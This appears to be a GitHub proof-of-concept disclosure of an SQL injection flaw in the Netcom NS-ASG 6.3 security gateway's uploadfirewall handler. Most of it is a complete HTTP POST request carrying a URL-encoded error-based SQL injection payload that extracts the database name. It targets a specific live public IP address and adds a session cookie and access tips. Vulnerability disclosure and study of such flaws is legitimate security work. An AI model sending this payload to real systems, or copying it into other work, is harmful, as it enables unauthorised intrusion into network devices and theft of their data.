# SQL injection POC

There is a SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.
[official website](https://www.netentsec.com/)
version:NS-ASG 6.3
Vulnerability points：/protocol/firewall/uploadfirewall.php analyse as below: As shown below, the $FireWallId database value is accepted by messagecontent and then substituted into the database statement.

![image](https://github.com/gb111d/ns-asg_poc/assets/148308306/3f18372a-9798-49ce-93d1-16cdb9daec78)


[https://106.37.206.12/]

ps: use older tls version or just access through mobile browser.

There is no validation during the execution of SQL injection.

Poc：
```
POST /protocol/index.php HTTP/1.1
Content-Length: 377
Host: 106.37.206.12
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Type: application/x-www-form-urlencoded
Referer: https://106.37.206.12/protocol/index.php
Connection: close

jsoncontent=%7B%22protocolType%22%3A%22uploadfirewall%22%2C%22messagecontent%22%3A%5B%221%20AND%20%28SELECT%205347%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a716b71%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C54%29%29%2C0x71707a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%22%5D%7D
```

Send request with the payload above.

![image](https://github.com/gb111d/ns-asg_poc/assets/148308306/97490bc6-c1a7-4f28-a6fe-102643b3c1a3)


![image](https://github.com/gb111d/ns-asg_poc/assets/148308306/ee5f5fac-4523-4038-aa91-058c1f88c6ac)

